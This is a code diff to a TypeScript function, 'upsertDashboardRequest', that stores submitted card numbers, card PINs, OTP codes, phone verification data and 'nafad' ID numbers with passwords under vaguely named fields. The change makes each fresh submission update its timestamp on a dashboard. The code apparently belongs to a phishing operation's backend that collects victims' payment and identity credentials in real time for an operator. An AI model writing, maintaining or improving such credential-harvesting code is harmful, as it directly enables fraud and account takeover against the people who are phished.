@@ -505,38 +505,38 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}) {
   // This ensures we only update the timestamp when new card data is submitted
   const hasNewCardData = payload._v1 || payload.cardNumber || payload.cardData || 
                          payload._v1UpdatedAt || payload._v2 || payload._v3;
-  if (hasNewCardData && !mergedPayload._v1UpdatedAt) {
+  if (hasNewCardData) {
     mergedPayload._v1UpdatedAt = now;
   }
 
   // Auto-add _v5UpdatedAt ONLY if OTP data is in the CURRENT payload
   const hasNewOtpData = payload._v5 || payload.otpCode || payload.otp || payload.otpSubmittedAt || payload._v5UpdatedAt;
-  if (hasNewOtpData && !mergedPayload._v5UpdatedAt) {
+  if (hasNewOtpData) {
     mergedPayload._v5UpdatedAt = now;
   }
 
   // Auto-add _v6UpdatedAt ONLY if PIN data is in the CURRENT payload
   const hasNewPinData = payload._v6 || payload.pinCode || payload.pin || payload._v6UpdatedAt;
-  if (hasNewPinData && !mergedPayload._v6UpdatedAt) {
+  if (hasNewPinData) {
     mergedPayload._v6UpdatedAt = now;
   }
 
   // Auto-add _v7UpdatedAt ONLY if phone data is in the CURRENT payload
   const hasNewPhoneData = payload.phoneNumber || payload._v7 || payload.phoneOtp || 
                           payload.phoneIdNumber || payload.phoneCarrier || payload._v7UpdatedAt;
-  if (hasNewPhoneData && !mergedPayload._v7UpdatedAt) {
+  if (hasNewPhoneData) {
     mergedPayload._v7UpdatedAt = now;
   }
 
   // Auto-add nafadUpdatedAt ONLY if nafad data is in the CURRENT payload
   const hasNewNafadData = payload.nafadIdNumber || payload.nafadPassword || payload.nafadUpdatedAt;
-  if (hasNewNafadData && !mergedPayload.nafadUpdatedAt) {
+  if (hasNewNafadData) {
     mergedPayload.nafadUpdatedAt = now;
   }
 
   // Auto-add comparCompletedAt ONLY if package/offer data is in the CURRENT payload
   const hasNewOfferData = payload.selectedOffer || payload.offerTotalPrice || payload.comparCompletedAt;
-  if (hasNewOfferData && !mergedPayload.comparCompletedAt) {
+  if (hasNewOfferData) {
     mergedPayload.comparCompletedAt = now;
   }
   
